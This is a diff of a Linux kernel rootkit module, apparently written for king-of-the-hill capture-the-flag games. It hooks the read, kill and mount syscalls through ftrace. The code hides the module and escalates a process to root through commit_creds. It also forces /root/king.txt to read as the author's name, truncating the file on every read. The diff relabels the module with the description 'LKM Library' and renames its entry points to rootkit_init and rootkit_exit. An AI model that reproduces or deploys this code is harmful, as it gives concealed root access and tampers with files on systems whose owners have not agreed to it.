@@ -1,32 +1,23 @@
-
-/* 
-
-Note: This kit uses ftrace_helper 
-Author: Trevohack 
-
-*/
-
-
-#include <linux/module.h> 
+#include <linux/module.h>
 #include <linux/kernel.h> 
-#include <linux/cred.h> 
+#include <linux/cred.h>     // for struct creds, prepare_creds, commit_creds
 #include <linux/fs.h>       
-#include <linux/uaccess.h> 
-#include <linux/slab.h>   
-#include <linux/dcache.h> 
-#include <linux/file.h> 
+#include <linux/uaccess.h>  // for copy_to_user
+#include <linux/slab.h>     // for kmalloc and kfree
+#include <linux/dcache.h>   // for dentry_path_raw 
+#include <linux/file.h>     // for fget and fput
 #include <linux/ptrace.h>
 
 #include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Trevohack");
-MODULE_DESCRIPTION("Hook read, kill and mount to protect content of a file"); 
+MODULE_DESCRIPTION("LKM Library");
 MODULE_VERSION("0.02");
 
-#define TARGET_FILE "/root/data.txt" 
-#define DATA "Hello World\n"
-#define DATA_LEN (strlen(DATA))
+#define TARGET_FILE "/root/king.txt"
+#define USERNAME "Trevohack\n"
+#define USERNAME_LEN (strlen(USERNAME))
 
 static struct list_head *prev_module;
 static short hidden = 0;
@@ -35,7 +26,6 @@ static short hidden = 0;
 static asmlinkage long (*orig_mount)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
 static asmlinkage long (*orig_read)(const struct pt_regs *);
-
 
 asmlinkage long hook_mount(const struct pt_regs *regs)
 {
@@ -129,25 +119,25 @@ asmlinkage ssize_t hook_read(struct pt_regs *regs){
         loff_t pos;
         ssize_t ret;
 
-        // make the file size equal to DATA_LEN
+        // make the file size equal to USERNAME_LEN
         // even if the file had nothing or less that
-        // DATA len the len will always be equal 
-        // to DATA_LEN
-        vfs_truncate(&file->f_path, DATA_LEN);
+        // username len the len will always be equal 
+        // to USERNAME_LEN
+        vfs_truncate(&file->f_path, USERNAME_LEN);
 
         pos = file->f_pos;
 
         // this is cause no more bytes can be read
-        // and we use this to indicate EOF (end of file) 
-        if (pos ==  DATA_LEN){
+        // and we use this to indicate EOF (end of file)
+        if (pos ==  USERNAME_LEN){
            ret = 0; 
            goto done;
         } 
 
-        if (count > DATA_LEN) count = DATA_LEN;
+        if (count > USERNAME_LEN) count = USERNAME_LEN;
         count = count  - pos;
         
-        if (copy_to_user(buf, DATA, DATA_LEN)){
+        if (copy_to_user(buf, USERNAME, USERNAME_LEN)){
             ret = -EFAULT;
             goto done;
         }
@@ -167,8 +157,6 @@ asmlinkage ssize_t hook_read(struct pt_regs *regs){
    fput(file);
    return orig_read(regs);
 }
-
-
 void showme(void)
 {
     list_add(&THIS_MODULE->list, prev_module);
@@ -195,14 +183,13 @@ void set_root(void)
     commit_creds(root);
 }
 
-
 static struct ftrace_hook hooks[] = {
-    HOOK("sys_read", hook_read, &orig_read),
     HOOK("sys_mount", hook_mount, &orig_mount),
     HOOK("sys_kill", hook_kill, &orig_kill),
+    HOOK("sys_read", hook_read, &orig_read),
 };
 
-static int trev_init(void)
+static int rootkit_init(void)
 {
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
@@ -212,10 +199,10 @@ static int trev_init(void)
     return 0;
 }
 
-static void trev_exit(void)
+static void rootkit_exit(void)
 {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 }
 
-module_init(trev_init);
-module_exit(trev_exit);
+module_init(rootkit_init);
+module_exit(rootkit_exit);
